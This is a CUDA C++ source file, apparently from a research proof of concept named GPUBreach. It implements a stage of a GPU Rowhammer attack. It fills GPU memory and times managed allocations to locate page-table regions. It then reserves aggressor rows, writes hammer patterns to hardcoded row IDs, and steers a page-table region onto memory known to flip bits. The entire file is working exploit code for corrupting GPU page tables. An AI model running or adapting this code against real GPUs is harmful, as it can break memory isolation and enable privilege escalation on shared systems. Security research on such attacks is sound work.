#include "./s1_allocallmem.cuh"
#include "./s2_firstRegion.cuh"
#include <algorithm>
#include <chrono>
#include <cmath>
#include <cuda.h>
#include <fstream>
#include <iostream>
#include <numeric>
#include <random>
#include <rh_impls.cuh>
#include <rh_kernels.cuh>
#include <rh_utils.cuh>
#include <string>
#include <thread>

void
first_PT_region_test (int argc, char *argv[])
{
  const uint64_t num_alloc_init = std::stoll (argv[0]);
  const double threshold = std::stod (argv[1]);
  const uint64_t skip = std::stoull (argv[2]);

  GPUBreachContext ctx;
  if (!alloc_all_mem (num_alloc_init, threshold, skip, ctx))
    {
      printf ("Error: Memory Allocation is wrong\n");
      exit (1);
    }

  uint8_t *temp;
  size_t total_byte;
  auto cuda_status = cudaMemGetInfo (nullptr, &total_byte);
  if (cudaSuccess != cuda_status)
    {
      printf ("Error: cudaMemGetInfo fails, %s \n",
              cudaGetErrorString (cuda_status));
      exit (1);
    }

  /**
   * 1. First allocation will be a 4KB data Page eviction
   * 2. Second eviction will be the PT Region allocation
   * 3. The 512th allocation will be a 4KB data Page eviction
   * 4. Step 2 + 508 (508 PT + 4 PD0s = 2MB) is the next PT Region allocation
   */
  uint64_t max_alloc_chunks = total_byte / ALLOC_SIZE;
  uint64_t next_id = max_alloc_chunks;
  for (uint64_t i = 0; i < max_alloc_chunks; i += 1)
    {
      // Create Free Space
      cudaMallocManaged (&temp, ALLOC_SIZE + 4096);

      double currentMS = time_data_access (temp + ALLOC_SIZE, 1);
      DBG_OUT << i << " New PT time: " << currentMS << " ms" << std::endl;

      if (i < skip || i % 512 == 0)
        continue;

      if (currentMS > threshold && next_id == max_alloc_chunks)
        {
          next_id = i + 508;
          std::cout << "Found First Allocation Spike: \033[1m" << i
                    << "\033[0m., Time: \033[1;31m" << " " << currentMS
                    << "\033[0m." << std::endl;
          std::cout << "Next Allocation Spike Id: \033[1m" << " " << next_id
                    << "\033[0m." << std::endl;
        }
      else if (currentMS > threshold)
        {
          std::cout << "Expected: id\033[1;32m " << next_id
                    << "\033[0m. Found Spike id: ";
          next_id == i ? std::cout << "\033[1;32m" : std::cout << "\033[1;31m";
          std::cout << i << "\033[0m." << std::endl;
          return;
        }
    }
}

static uint64_t
hardcoded_rowhammer_bitflip_page (GPUBreachContext &ctx)
{
  uint8_t *temp;
  auto& alloc_ptrs = ctx.step1_data.alloc_ptrs;
  auto& agg_ptrs = ctx.step2_data.agg_ptrs;
  auto& agg_row_list = ctx.step2_data.agg_row_list;
  auto& agg_vec = ctx.step2_data.agg_vec;
  uint8_t *layout = (uint8_t *)alloc_ptrs[0];

  const uint64_t num_agg = ctx.bitflip_config.num_agg;
  const uint64_t step = 256;
  const uint64_t min_rowId = 30016 - 94;
  const uint64_t max_rowId = 30016 + 5;
  const uint64_t row_step = 4;
  const uint64_t num_rows = 31000;
  const uint64_t agg_pat = std::stoull ("0xAA", nullptr, 16);

  const std::string BREACH_ROOT = std::string(std::getenv("BREACH_ROOT"));

  if (BREACH_ROOT == std::string()) {
      std::cout << "BREACH_ROOT is not set" << std::endl;
      return 1;
  }
  std::ifstream row_set_file (BREACH_ROOT + "/gpuhammer/"
                              "results/row_sets/ROW_SET_A.txt");
  RowList rows = read_row_from_file (row_set_file, layout);
  row_set_file.close ();

  /* Get Target Aggressors That Trigger the Bit-flip */
  std::vector<uint64_t> target_agg;
  std::vector<uint64_t> all_vics (num_rows);
  std::iota (all_vics.begin (), all_vics.end (), 0);
  target_agg = get_aggressors (rows, min_rowId, num_agg, row_step);

  // The first page to reserve required for Rowhammer Attack
  uint64_t first_hammer_page
      = static_cast<uint64_t> (rows[target_agg[0]][0] - layout) / ALLOC_SIZE;

  // The last page to reserve required for Rowhammer Attack. This case, its the
  // VICTIM page.
  uint64_t last_hammer_page
      = static_cast<uint64_t> (rows[max_rowId - 5][0] - layout) / ALLOC_SIZE;
  uint16_t to_reserve
      = last_hammer_page - first_hammer_page; // Last page excluded.

  /**
   * Segragate aggressor row pages from the rest, using same insight as Paper
   * Section 4.3 Given our memory is full, freed physical memory is immediately
   * reused. We use this to conserve the memory for Rowhammer from the
   * massaging memory.
   */
  for (uint64_t i = 0; i < to_reserve; i++)
    {
      evict_from_device (alloc_ptrs[first_hammer_page + i], ALLOC_SIZE);
      cudaMallocManaged (&temp, ALLOC_SIZE);
      time_data_access (temp, ALLOC_SIZE);
      agg_ptrs.push_back (temp);
      DBG_OUT << first_hammer_page + i << '\n';
    }

  auto offset_map = get_relative_aggressor_offset (rows, target_agg, layout);
  auto row_agg_pair
      = get_aggressor_rows_from_offset (agg_ptrs, offset_map);
  set_rows (row_agg_pair.first, row_agg_pair.second, agg_pat, step);
  cudaDeviceSynchronize ();

  agg_row_list = row_agg_pair.first;
  agg_vec = row_agg_pair.second;

  return last_hammer_page;
}

bool
first_PT_region (int argc, char *argv[])
{
  const uint64_t num_alloc_init = std::stoll (argv[0]);
  const double threshold = std::stod (argv[1]);
  const uint64_t skip = std::stoull (argv[2]);
  GPUBreachContext ctx;

  return first_PT_region (num_alloc_init, threshold, skip, ctx);
}

bool
first_PT_region (uint64_t num_alloc_init, double threshold, uint64_t skip, GPUBreachContext &ctx)
{
  if (!alloc_all_mem (num_alloc_init, threshold, skip, ctx))
    {
      std::cout << "Error: Memory Allocation is wrong" << "\n";
      exit (1);
    }

  /****************************************************************/
  /* Unfortunately the Rowhammer Bit-flip is currently hardcoded. */
  /* Future plan: add configuration files instead of cmdline args */

  /**
   * This variable controls which page in 'alloc_ptrs' we massage
   * the PT region to. Given a page is 2MB, changing it to whatever
   * page you'd like that fits in your VRAM, but 1000-3000 should be
   * feasible on most GPUs (8GB+).
   */
  auto& alloc_ptrs = ctx.step1_data.alloc_ptrs;
  auto last_hammer_page = hardcoded_rowhammer_bitflip_page (ctx);

  /****************************************************************/
  /* Step 2 of Paper: Massaging first PT Region to Flippy Memory */
  /****************************************************************/
  uint8_t *temp;
  std::vector<uint8_t *> misc_ptrs;
  uint64_t ERR_next_id = std::numeric_limits<uint64_t>::max ();
  uint64_t next_id = ERR_next_id;
  
  for (uint64_t i = 0; i < num_alloc_init; i += 1)
    {
      // Create free space for Page Table Region
      if (i == next_id)
        evict_from_device (alloc_ptrs[last_hammer_page], ALLOC_SIZE);

      cudaMallocManaged (&temp, ALLOC_SIZE + 4096);

      double currentMS = time_data_access (temp + ALLOC_SIZE, 1);
      DBG_OUT << i << " New PT time: " << currentMS << " ms" << std::endl;

      misc_ptrs.push_back (temp);
      if (i < skip || i % 512 == 0)
        continue;

      if (i == next_id)
        break;
      if (currentMS > threshold && next_id == ERR_next_id)
        next_id = i + 508;
    }

  if (debug_enabled())
  {
    std::cout << "(Step 2 Done) First PT Region Generated: Press "
               "\033[1;32mEnter Key\033[0m to continue... "
            << '\n';
    paused ();
  }
  else
  {
    std::cout << "(Step 2 Done) First PT Region Generated\n";
  }

  /****************************************************************/

  /* Free up GPU/CPU memory by releasing the evicted memories */
  cudaFree (alloc_ptrs[0]);
  alloc_ptrs.clear ();

  for (uint64_t i = 0; i < next_id; i += 1)
    cudaFree (misc_ptrs[i]);
  misc_ptrs.clear ();
  /****************************************************************/

  return true;
}
